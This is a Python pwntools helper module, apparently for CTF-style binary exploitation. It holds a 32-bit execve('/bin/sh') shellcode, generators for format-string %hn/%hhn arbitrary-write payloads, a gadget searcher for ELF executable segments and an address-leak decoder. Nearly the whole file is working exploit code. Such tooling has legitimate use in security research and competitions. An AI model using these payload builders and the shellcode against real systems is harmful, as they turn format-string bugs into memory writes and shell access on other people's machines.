#coding: utf-8

import time
from pwn import *

'''
import sys
sys.path.append('/media/sf_F_DRIVE/Research/lib')
from Mix import *
'''

gBinSh32 = """
xor ecx, ecx
mul ecx
mov al, 0xb

push ecx
push 0x68732f2f
push 0x6e69622f

mov ebx, esp	
int 0x80
"""

class Elapsed:
	def __init__(self):
		self.start = time.time()
		
	def sc(self, str=None):
		end = time.time()
		if str != None:
			print("%s: %f" % (str, end - self.start))
		else:
			print(end - self.start)
		self.start = end

	def chop(self):
		end = time.time()
		ret = end - self.start
		self.start = end
		return ret
		
class MyELF(ELF):
	def __init__(self, aModule):
		ELF.__init__(self, aModule)

	def searchAsm(self, needle, textAsm = True):
		"""searchAsm(needle, writable = False) -> str generator
		Search the ELF's virtual address space for the specified string.
		Arguments:
			needle(str): String to searchAsm for.
			segments(segment): specify segments
		Returns:
			An iterator for each virtual address that matches.
		Examples:
			>>> bash = ELF(which('bash'))
			>>> bash.address + 1 == next(bash.searchAsm('ELF'))
			True
			>>> sh = ELF(which('bash'))
			>>> # /bin/sh should only depend on libc
			>>> libc_path = [key for key in sh.libs.keys() if 'libc' in key][0]
			>>> libc = ELF(libc_path)
			>>> # this string should be in there because of system(3)
			>>> len(list(libc.searchAsm('/bin/sh'))) > 0
			True
		"""
		if textAsm == True:
			needle = asm(needle)
		segments = self.executable_segments
		load_address_fixup = (self.address - self.load_addr)

		for seg in segments:
			addr   = seg.header.p_vaddr
			data   = seg.data()
			offset = 0
			while True:
				offset = data.find(needle, offset)
				if offset == -1:
					break
				yield (addr + offset + load_address_fixup)
				offset += 1
		
def genFmtStrForValueList(ctrlOffset, valueList, writeSize='byte'):
	"""
	param:
		+ ctrlOffset: format string offset that you can control, assuming the start of the buffer, is number of dwords/qwords
		+ addrList: [int, ...]
		+ writeSize: 'byte' or 'short'
	"""
	if writeSize == 'byte':
		mPow = 8
		flag = 'hhn'
	else:
		mPow = 16
		flag = 'hn'
	now = 0
	fmt = ''
	for i in range(len(valueList)):
		v = valueList[i]
		assert v < 2**mPow
		t = v - now
		if t == 0: fmt += "%{}${}".format(ctrlOffset + i, flag)
		else:
			if t < 0:
				t += 2**mPow # use integer overflow
			fmt += "%{}c%{}${}".format(t, ctrlOffset + i, flag)
		now = v
	return fmt
		
def genFmtStr(ctrlOffset, addrDict, aWhole=True, writeSize='short', writtenLen = 0):
	"""
	param:
		+ ctrlOffset: format string offset that you can control, assuming the start of the buffer, is number of dwords/qwords
		+ addrDict: {addr: str, ...}
		+ aWhole: = True if fmt and flatten_addrs are both put in the buffer
		if aWhole: return fmt_flatten_addrs
		else return [fmt,flatten_addrs]
		+ writeSize: 'byte' or 'short'
	"""
	newDict = {}
	for addr in addrDict:
		vStr = addrDict[addr]
		if writeSize == 'byte':
			for i in range(len(vStr)):
				newDict[addr+i] = ord(vStr[i])
		elif writeSize == 'short':
			if (len(vStr)%2 != 0):
				raise Exception("genFmtStr: odd len for short writes")
			for i in range(len(vStr)/2):
				newDict[addr+i*2] = ord(vStr[i*2]) | (ord(vStr[i*2+1]) << 8)
		else:
			raise Exception("genFmtStr: invalid writeSize")
	return generateFmtStrInBytesOrShorts(ctrlOffset, newDict, aWhole, writeSize, writtenLen)

def generateFmtStrInBytesOrShorts(ctrlOffset, addrDict, aWhole=True, writeSize='byte', writtenLen = 0):
	"""
	param:
		+ ctrlOffset: format string offset that you can control, assuming the start of the buffer, is number of dwords/qwords
		+ addrDict: {addr: int, ...}
		+ aWhole: = True if fmt and flatten_addrs are both put in the buffer
		if aWhole: return fmt_flatten_addrs
		else return [fmt,flatten_addrs]
		+ writeSize: 'byte' or 'short'
	"""
	# sort x of "%{}c%{}$(h)hn" in increasing order.
	# then padding, and add addresses at the end.
	# => payload length should be short
	if context.arch == 'i386':
		padding = 4
		__p = p32
	elif context.arch == 'amd64':
		padding = 8
		__p = p64
	else:
		raise Exception("Error architecture")
	if writeSize == 'byte':
		flag = 'hhn'
		round = 256
	else:
		flag = 'hn'
		round = 2**16
	''' if writtenLen != 0, have to subtract by this value, and round when < 0'''
	for addr in addrDict:
		addrDict[addr] -= writtenLen
		if addrDict[addr] < 0: addrDict[addr] += round
	mList = addrDict.items()
	mList.sort(key=lambda x: x[1])
	flatten_addrs = ''.join(__p(x[0]) for x in mList)
	if aWhole:
		i = 1 # i surely not 0
		while(True): # try increasing offsets for {} of "%{}$(h)hn" until got suitable value.
			off = ctrlOffset+i
			fmt = ''
			for k in range(len(mList)):
				if k == 0:
					addup = mList[k][1]
				else:
					addup = mList[k][1] - mList[k-1][1]
				if addup == 0:
					fmt += "%{}${}".format(off+k, flag)
				else:
					fmt += "%{}c%{}${}".format(addup, off+k, flag)
			if len(fmt) % padding != 0: # padding
				fmt += 'A'*(padding - len(fmt)%padding)
			if ctrlOffset+len(fmt)/padding != off:
				i += 1
				continue # off not satisfy -> inc
			return fmt+flatten_addrs
	else:
		off = ctrlOffset
		fmt = ''
		for k in range(len(mList)):
			if k == 0:
				addup = mList[k][1]
			else:
				addup = mList[k][1] - mList[k-1][1]
			if addup == 0:
				fmt += "%{}${}".format(off + k, flag)
			else:
				fmt += "%{}c%{}${}".format(addup, off + k, flag)
		return [fmt, flatten_addrs]

def leakedToAddr(leaked):
	'''
	params:
		leaked: binary string leaked from server.
		return address corresponding to the context arch. If length is not adequate, \x00s are added to the end
	'''
	if context.arch == 'i386':
		addrSize = 4
		__p = u32
	elif context.arch == 'amd64':
		addrSize = 8
		__p = u64
	else:
		raise Exception("Error architecture")
	if len(leaked) <= 8:
		leaked += '\x00'*(8-len(leaked))
	else:
		leaked = leaked[:8]
	return __p(leaked)